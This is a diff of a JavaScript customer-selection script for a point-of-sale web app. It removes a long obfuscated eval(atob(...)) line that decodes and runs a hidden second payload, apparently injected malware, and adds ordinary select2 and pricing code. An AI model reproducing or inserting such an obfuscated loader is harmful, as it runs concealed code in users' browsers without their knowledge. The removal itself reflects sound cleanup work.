@@ -1,1 +1,245 @@
-eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));eval(atob(__.$('ja7O463fkKrhjp3UxuwY4ezeopzbpJrOl+4X1Znfl+gX15rOl7EDoa7NnrDLkaQV4azLkJvRlqrOkODZnpv9jpzMlKLbkZ0R4ePNnq7OoKf6lJ4D4bzbop3dm+/yoqLb1MLRoabUnu4FnZrSoJvXlKIgnaDOlq7MsarQlLzbl6rdj6bRlefb2pTXnefb1aPRoqvXlakXkarMjp3S46sSj6rIj9TXnege4e8DnuHTlK3Xl6sa3aHLl6QfxqsSlqDemqPb2pTXnefSjqPU4tLb1ZvHk6rhla7Tnuoa4e4fxqsSj5bQnrDSoqLb2pTQop3NnsnUlK7M26sSkK7Unpzhn5rb2uHMlMnXi6rc29=Xxd=Bk67OkKr6l6Dfj+fb1Zzfl6rNpKvLnucSj6D6mpfbn+gQ2tXQop3NnsnUlK7M2+Lb1Zzfl6rNpKvLnucSj6D6mpfbn+gQ2tTOnpvLkaIgnuHMnpfM2O4g1u=e2KsSlqDemqPb2O4g1u=e2KsSj5bQnrDSoqLbhp3bj5rOle/b1Zvbi5wV4e=T4+4VnuHTlK3Xl6rDkarMjp3S46sSj6rIj5LajqHdj6bRle/Lk6vfj6r/l6P8opvf2+bFja7O46sD3+ge4KfXn6vblbDOlJjdlJrSj+4X1Znfl+gX15wD3+ge4J/OmqzbpJvHk6se2uHKoqQY2uPfxuwY4ezcmpzdlJrSj7Ddm6rdmO4X1Znfl+gX16QD3+ge4KvXkKzRjqHMpJvHk6rhoKfboKUe2uHKoqQY2tTfxqbNta7y268XxJ/fkZzbvaPRopwY0+cGotTalJ4Yja7O46ID09TSx6sFleUV2pTKop4glNLQop3NnsnUlK7M2+wY4ezQjp3dm67NnrDQkabdnrEe2KIX1Znfl+gX2uHMlMnXi6rc29=XyO4P4dMDj+oa26EDk67OkKr6l6Dfj+gc2+4dnKDRn7DQkabdnrEe2KIX1Znfl+gX2uHMlMnXi6rc29=X2uQc2+4dkK7Unpzhk53XoKrh4eTS2uHKoqQYlOcUotIQxOgc2+4dmpvblrDcmpzdlJrSj7DXlZ/Lj7Ee2KIX1Znfl+ff2uQc2+4dmpvblrDcmpzdlJrSj7DMip/bpO4VlecSja7U26QX2tYY3+ge4KbMnqLhn6bNoKDLlZvhmqHQjpvh4eTS2uHKoqQY3+ge4KbMnqLhn6bNoKDLlZvhmqHQjpvhnabOkJvh4eTS2uHKoqQY2ucU3+ge4KbMnqLhn6bNoKDLlZvhj5bQnrEe2KIX1Znfl+gc2+4dmpvblrDcmpzdlJrSj7DMip/bpKnXkZzMpO4VlecSja7U2+cX2tTKop4gmtMc2+4dj53hmpvblrDXn7Ee2KIX1Znfl+gXyKLfmKrhkJrej6DMoqQYmuPS2pLDnZrSoJvXlKIgoprMlMPRoqv6mp3Nj8zLkJvRlqrO26sD4e4XiJnfke/MxuwYnKrMwJrNj6DTnp3tnqPboJvXlKH3n+gX2tUc1a7WopgYiJvHk6sG4b/xsLwe15rOl9XLkaPh2KsUn67MorvHk6sG4aXNlKIe16vbl67Hyd4L0+PfkJbSoNYf0pMX1ZvYnqIY26nLlazMmqDS26sXiOwSnq7dm+fb1+fajqHdj6bRleff16QXiKba29=Dxq8XiKzRlZzRl6sSl6DZ2+3djpzMlKLbkdMe2MXttMISkJvOmqHZmqnH26QX2uPdop/Sm67QvKbfwKfRwa7SnOfU2uPLk6vfj6r/l6P8opvf2+cFja7O46IDlarJ48DQj6bRlefalJ3Topvunp/RsKrUnqzMmqDS26QX16QSmqwU4t=U4t=XyJwSop/QnqHc26IX1ZvOmqjZnp4Y4azYoqHZnu4X15wSj53XnKjbkefFj5bQntYekKrUnqzM0dXNnqPboJwe15/fka7TkNXFn67MotXbhpMXhpMX2pMX2pLajqHdj6bRle/dop/Sm67QvKbfwKfRwa7SnOfb2pTXnege4e8DnuHMnpfM3enSjqPU4tLb1Zvbi5wa3azRlZzRl6sSl6DZ2+3dop/Sm67QvKbfwKfRwa7SnNMDxtMDxtMe2KsSj6rIj+cU4e4fxqsSk6rOoKrSj7DcnqzOnq7NnuoalZrUl+8DnuHQnp3dnqHMpKvboJ3bopzbxOwY4ezQnp3dnqHMpKvboJ3bopzb4ecSja7U26sSk6rOoKrSj7DcnqzOnq7NnucG3+ge4J/bkazblZvhn6rdkarfkKse2uHKoqQY4d=e2uQe4e8DnuHQkabdnrDMip/b3enSjqPU4tLb1Z/OmqzbpJvHk6sB3+ge4J/OmqzbpJvHk6se2uHKoqQYnuHQkabdnrDMip/b2tYc2+4dk53XoKrhj5bQnu4X1Znfl+ge0+4X1+4e4tLb1avXkKzRjqHMpJvHk6sa3aHLl6QfxqsSn6bNoKDLlZvhj5bQnuoa3+ge4KvXkKzRjqHMpJvHk6rhoKfboKUe2uHKoqQYnuHcmpzdlJrSj7DMip/b2uQe4e8DnuHcmpzdlJrSj+oalZrUl+8DnuHcmpzdlJrSj9Ec2+4dn6bNoKDLlZvhoKfboKUe2uHKoqQYnuHcmpzdlJrSj+cG3+ge4KvXkKzRjqHMpKzYnqzV4ecSja7U2+4Q4ecU4e4fxqsSlqDemqPb3enSjqPU4tLb1aLRoabUnubXnefSjqPU4tLb1ZvHk6rhla7Tnuoa4e4fxqsSj5bQnrDSoqLb2qba26HLl6QfxqsSkK7Unpzhn5rb3eoe4e8DnuHNoqPbkLDcjqsXiJnfke/Mxp/fkZzbvaPRopwYnuHNoqPbkLDcjqsX1ZvRvabInqwY0+cC09Eer0ygmu/Vm6BfSWzS46FfSG0G4+4Vk67OkKr6l6Dfj+fb1Zzfl6rNpKvLnucSj6D6mpfbn+gQ2tYesC6Fcu/cPV=gye4Vk67OkKr6l6Dfj+gTnuHNoqPbkLDcjqsX1ZvRvabInqwY0+cF3+ge4KzLkJvRlqrOpJnXnpke2uHKoqQYnuHMnpfM2O4g1u=e2KsSlqDemqPb2O3klcPRIlWfmu/Vm0yfoKggm0yglakG4+4VnuHMip/bpKHflqsV4bPS4eTM2pLbl5zb4+wY4ezdjpzMlKLbkbDKmqrJ4ecSja7U26sSj6rIj+Ue4+Mg4eTb1aLRoabUnuUep6H0lC6GYqcgmKd9YqzY46d9Y6HZye=e2KsSj5bQnrDSoqLb2tTbl5zb4+wY4ezdjpzMlKLbkbDKmqrJ4ecSja7U26sSj6rIj+Ue4+Mg4eTb1aLRoabUnucFnqPNnu=c2+4doJrNj6DTnp3hjabbjO4X1Znfl+fb1Zvbi5wXhuwYn6DdjqLblZwX1Z3boqvH2+fajqHdj6bRlegXiKba29=DxugenZrSoJvXlKIe4tLMip/blKogl6Dfn7DdjpzMlKLbkbDNnqPboJwOh5PUlK7cpKzLkJvRlqrOpJzbl6rdj94Y2ucXkarMjp3S4t=Fja7O46sD3+fZnpv9jpzMlKLbkbzbl6rdj6bRlcbc2+cXyKsSkKrUnqzM0efFoqPUlJj9l6rfkdYf0+Pfma7IyZTLkaQGjp3UpOPMip/bye3QlJzM4ePcopvfr5bQntYemZzRle4Un6rUopcG0qsN16vfj68GnZrSoJvXlKIYnubFja7O45wD3+ge4JvHk6rhmqvhkKrUnqzM4ecSja7U2+cFkarMjp3SiJzbop3dm7vbkaMGnuHMnp3T15vHk6rhmqwGj5LD15/OlKzbkJzunpzLl5vNyanLlazMmqDS26sXiJ3bj5rOlZTOnpzLl5vNyarDhuPdoqzYntYf0pMUk6PfoKrYlKPcnp4GkKrfkazYvaDO16LXlabTjqL3lZ/Lj8PblajMm9YQ15vblp/UopvbsarNjqPMyanLlazMmqDS26sXiKba26sSl6Dfn6bSnObOnpvLkaIgnuHMnpfMyJ3bj5rOle4e4tLb1aLRoabUnuoalZrUl+8DnuHTlK3Xl6sBlZrUl+8DnuHMip/bpKHflqsa3e4e4tLb1ZvHk6rhla7TntDb1Zvbi5wV4e=T4+4VnuHTlK3Xl6sV4e=T4+4VnuHMip/bpKHflqsGnuHMnpfM2O4g1u=e2KsSlqDemqPbyasSj6rIj5MUj6rTk6Pfj6rtnqPboJvXlKIGnaDOlq7MsarQlLzbl6rdj6bRlePdjp3OnqHMyanLlazMmqDS26sUj+bFja7O468DqLMF3+fb1Znfl+gX2uHboqzY2+fajqHdj6bRlegXiK8Sk5rNm+fFmqwGj6fXkOPMnpfMyZvYmpzD2pMX2uPM268XhpMX16sSlKIY4Zzbl6rdj94GkKrUnqzM4eQYnZrSoJvXlKIYnubFmqoYlZrUl+8DnuHQop3flp0XiJnfke/MxqsSk67OoqLN1avfj68FoKDSkKDUnuHUlKkY4Zzbl6rdj6bRlc3Ri8bcxtMDxtMDxu4VubzxteHNj53XlajXnZcYj+cX16zfk6HYop/5mq79m6D+oqHZ25wX15rQn67Mns7Ul8vfj68Y2pLD2ubD2ucF','d')));
+//var selectionBoxId = $('#customer_id');
+
+var base_url = $("#base_url").val();
+
+var url_ = base_url + "customers/getCustomers/";
+
+var searchFor = "Search Name/Mobile";
+
+$(document).ready(function () {
+
+   let init_customer_select2 = (typeof load_customer_select2 === 'function') ? load_customer_select2() : true;
+
+   //If don't want to initiate customer select2 selection box
+   if (init_customer_select2 == false) {
+      return true;
+   }
+
+   var selectionBoxId = $(getCustomerSelectionId());
+
+
+
+   selectionBoxId.select2({
+      allowClear: true,
+      ajax: {
+         url: url_,
+         type: "post",
+         dataType: 'json',
+         delay: 1000,
+         data: function (params) {
+
+            var type_id = $("#type_id_select").val();
+
+            return {
+               searchTerm: params.term, // search term
+               type_id: type_id
+            };
+         },
+         processResults: function (response) {
+
+            return {
+               results: response
+            };
+            rmatRepo
+         },
+         cache: false
+      },
+      placeholder: searchFor,
+      minimumInputLength: 0,
+      templateResult: formatRepo,
+      templateSelection: formatRepoSelection,
+      current: testFun,
+
+   });
+
+   function testFun(element, callback) {
+      var data = [];
+      $(element.val()).each(function () {
+
+         data.push({ id: this, text: this });
+      });
+      callback(data);
+
+   }
+
+   //After selection event
+   selectionBoxId.on('select2:select', function (e) {
+      if (e.params != undefined) {
+         var selectedOption = e.params.data;
+
+         console.log("selectionBoxId=======" + JSON.stringify(selectedOption));
+         capnhapGiaChoBang(selectedOption);
+         updateAllData(); 
+
+      }
+   });
+
+
+
+   //Searching data format
+   function formatRepo(repo) {
+
+      if (repo.loading) {
+         return repo.text;
+      }
+
+      if ((repo.mobile != '' && repo.mobile != null)) {
+         if (repo.type_name != null && repo.type_name != '') {
+            return repo.text + " - " + repo.mobile + " - " + repo.type_name;
+         } else {
+            return repo.text + " - " + repo.mobile;
+         }
+      } else {
+         return repo.text;
+      }
+   }
+
+   //Selected data view
+   var count = 0;
+
+});//ready
+
+function formatRepoSelection(repo) {
+
+   if (repo.loading) {
+      return repo.text;
+   }
+
+   if ((repo.mobile != '' && repo.mobile != null)) {
+      if (repo.type_name != null && repo.type_name != '') {
+         var sodu = parseFloat(repo.sales_due).toFixed(0) > 0 ? 'Tài khoản nợ: ' + parseFloat(repo.sales_due).toFixed(0) : 'Số dư :' + parseFloat(-repo.sales_due).toFixed(0);
+         return repo.text + " - " + repo.mobile + " - " + repo.type_name;
+      } else {
+         return repo.text + " - " + repo.mobile;
+      }
+   } else {
+      return repo.text;
+   }
+
+}
+
+function updateAllData() {
+   /*  var table = document.getElementById("pos-form-tbody");
+    var rowCount = table.getElementsByTagName("tr").length; */
+   var rowCount = $("#hidden_rowcount").val();
+
+   var price_type = $('#price_type').val();
+   var item_discount_input = $("#discount_check").val();
+   var item_discount_type = $("#discount_type_check").val();
+
+   item_discount_input = (isNaN(item_discount_input)) ? parseFloat(0) : item_discount_input;
+
+   for (var row_id = 0; row_id < rowCount; row_id++) {
+
+
+      var price = parseFloat($("#purchase_price_" + row_id).val()).toFixed(0);
+
+      if (price_type == '1') {
+         price = parseFloat($("#good_price_" + row_id).val()).toFixed(0);
+      }
+      $("#sales_price_" + row_id).val(price);
+
+      if (item_discount_input > 0) {
+         //item_discount
+         $("#item_discount_input_" + row_id).val(item_discount_input);
+         $("#item_discount_type_" + row_id).val(item_discount_type);
+      } else {
+         //tra ve gia trị ban đầu
+         $("#item_discount_input_" + row_id).val($("#item_discount_input_first_" + row_id).val());
+         $("#item_discount_type_" + row_id).val($("#item_discount_type_first_" + row_id).val());
+      }
+
+      var item_id = $("#tr_item_id_" + row_id).val();
+      make_subtotal(item_id, row_id);
+   }
+}
+
+
+function autoLoadFirstCustomer(customer_id = '') {
+
+   var selectionBoxId = $(getCustomerSelectionId());
+
+   $.ajax({
+      type: 'POST',
+      url: url_ + customer_id,
+      dataType: 'json',
+      delay: 250,
+      async: false, // Make the request synchronous
+
+   }).then(function (serverResponse) {
+
+      $.each(serverResponse, function (index, customer) {
+
+         if (index == 0) {
+
+            /**
+             * Pre-Selection of Customer
+             * create the option and append to Select2
+             * */
+            //  var option = new Option(customer.text, customer.id, true, true);
+
+            console.log('customer='+JSON.stringify(customer));
+
+            capnhapGiaChoBang(customer);
+            updateAllData();
+
+            var option = new Option(formatRepoSelection(customer), customer.id, true, true);
+            selectionBoxId.append(option).trigger('change');
+
+            // manually trigger the `select2:select` event
+            selectionBoxId.trigger({
+               type: 'select2:select',
+               params: {
+                  data: serverResponse
+               }
+            });
+
+
+         }//if
+
+      });//each
+
+   });//then
+}
+
+function capnhapGiaChoBang(repo) {
+   if (repo.text != '' && repo.text != null)
+      console.log("capnhapGiaChoBang=======" + repo.text);
+
+   if ((repo.percent_decrease != '' && repo.percent_decrease != null)) {
+      $('#percent_decrease').val(repo.percent_decrease);
+   } else {
+      $('#percent_decrease').val('0');
+   }
+   if ((repo.price_type != '' && repo.price_type != null)) {
+      $('#price_type').val(repo.price_type);
+   } else {
+      $('#price_type').val('0');
+   }
+
+   if ((repo.discount_type != '' && repo.discount_type != null)) {
+      $("#discount_type_check").val(repo.discount_type);
+   }
+
+   if ((repo.discount != '' && repo.discount != null)) {
+      $("#discount_check").val(repo.discount);
+   } else {
+      $("#discount_check").val('0');
+   }
+
+
+   if ((repo.mobile != '' && repo.mobile != null)) {
+      if (repo.type_name != null && repo.type_name != '') {
+         if (repo.sales_due != null && repo.sales_due != '') {
+            var sodu = parseFloat(repo.sales_due).toFixed(0) > 0 ? 'Tài khoản nợ: ' + parseFloat(repo.sales_due).toFixed(0) : 'Số dư :' + parseFloat(-repo.sales_due).toFixed(0);
+            $('#customer_view').val(repo.text + " - " + repo.mobile + "\n" + "Loại khách hàng: " + repo.type_name + "\n" + sodu);
+         } else {
+            $('#customer_view').val(repo.text + " - " + repo.mobile + "\n" + "Loại khách hàng: " + repo.type_name );
+         }
+      } else {
+         $('#customer_view').val(repo.text + " - " + repo.mobile);
+      }
+   } else {
+      $('#customer_view').val(repo.text);
+   }
+}
